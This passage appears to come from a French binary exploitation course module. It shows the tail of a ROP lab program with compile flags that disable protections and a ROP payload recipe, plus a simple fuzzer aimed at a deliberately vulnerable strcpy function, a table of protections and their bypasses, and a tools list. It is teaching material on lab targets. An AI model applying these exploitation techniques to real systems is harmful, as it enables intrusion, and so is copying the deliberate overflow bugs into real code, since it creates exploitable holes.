int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <payload>\n", argv[0]);
        return 1;
    }

    vulnerable(argv[1]);

    printf("\nProgram completed\n");

    return 0;
}

/*
Compilation (sans PIE pour faciliter):
gcc -fno-stack-protector -no-pie rop.c -o rop

Exploitation:

1. CrÃ©er le payload ROP:

payload = "A" * 72                  # Padding
payload += p64(gadget1_addr)        # pop rdi; ret
payload += p64(0xdeadbeef)          # argument RDI
payload += p64(gadget2_addr)        # pop rsi; ret
payload += p64(0xcafebabe)          # argument RSI
payload += p64(win_function_addr)   # Fonction finale

2. ExÃ©cuter:
   ./rop "$(python3 exploit.py)"
*/
```

### 3. Fuzzer simple pour trouver des bugs

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/wait.h>

// Programme cible Ã  fuzzer
void target_function(char *input) {
    char buffer[64];

    if (strlen(input) > 100) {
        // Bug potentiel
        strcpy(buffer, input);
    }
}

void generate_random_input(char *buffer, int max_len) {
    int len = rand() % max_len;

    for (int i = 0; i < len; i++) {
        buffer[i] = rand() % 256;
    }

    buffer[len] = '\0';
}

void fuzz() {
    char input[256];
    int iterations = 0;
    int crashes = 0;

    printf("=== Simple Fuzzer ===\n\n");
    printf("[*] Fuzzing target_function()...\n\n");

    while (iterations < 1000) {
        generate_random_input(input, sizeof(input));

        pid_t pid = fork();

        if (pid == 0) {
            // Processus enfant: test
            target_function(input);
            exit(0);
        } else {
            // Processus parent: monitoring
            int status;
            waitpid(pid, &status, 0);

            if (WIFSIGNALED(status)) {
                // Crash dÃ©tectÃ©!
                crashes++;
                printf("[!] CRASH #%d detected!\n", crashes);
                printf("    Input length: %lu\n", strlen(input));
                printf("    Signal: %d\n", WTERMSIG(status));
            }
        }

        iterations++;

        if (iterations % 100 == 0) {
            printf("[*] Iterations: %d, Crashes: %d\n",
                   iterations, crashes);
        }
    }

    printf("\n[+] Fuzzing complete\n");
    printf("[+] Total iterations: %d\n", iterations);
    printf("[+] Total crashes: %d\n", crashes);
}

int main() {
    srand(time(NULL));
    fuzz();
    return 0;
}
```

## ğŸ“ Points clÃ©s Ã  retenir

1. **Buffer Overflow** : Ã‰craser la return address pour contrÃ´ler EIP/RIP
2. **Format String** : %n pour Ã©crire, %x pour lire
3. **Use-After-Free** : RÃ©allouer avec donnÃ©es malveillantes
4. **ROP** : Bypass NX en rÃ©utilisant du code existant
5. **Protection** : Toujours valider les inputs utilisateur

### Protections et bypass

```
Protection          But                           Bypass
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Stack Canary       DÃ©tecter overflow             Leak canary
NX/DEP             EmpÃªcher exec pile            ROP
ASLR               Randomiser adresses           Info leak
PIE                Randomiser code               Info leak + ROP
RELRO              ProtÃ©ger GOT                  Partial RELRO
```

### Outils d'exploitation

- **gdb-peda/gef** : Debugger amÃ©liorÃ© pour exploitation
- **ROPgadget** : Trouver des gadgets ROP
- **pwntools** : Framework Python pour exploits
- **radare2** : Reverse engineering
- **AFL/libfuzzer** : Fuzzers pour trouver des bugs

## â¡ï¸ Prochaine Ã©tape

Maintenant que tu maÃ®trises l'exploitation de vulnÃ©rabilitÃ©s, tu es prÃªt pour le **Module 54 : Reverse Engineering**, oÃ¹ tu apprendras Ã  analyser des binaires, comprendre le code machine et dÃ©sassembler des programmes.

### Ce que tu as appris
- Buffer overflow exploitation
- Format string attacks
- Use-After-Free exploitation
- ROP chains pour bypass NX
- Fuzzing basique
- MÃ©thodologie d'exploitation

### Ce qui t'attend
- DÃ©sassemblage de binaires
- Analyse statique et dynamique
- DÃ©compilation
- Unpacking de malwares
- Analyse de protocoles
- Cracking de protections
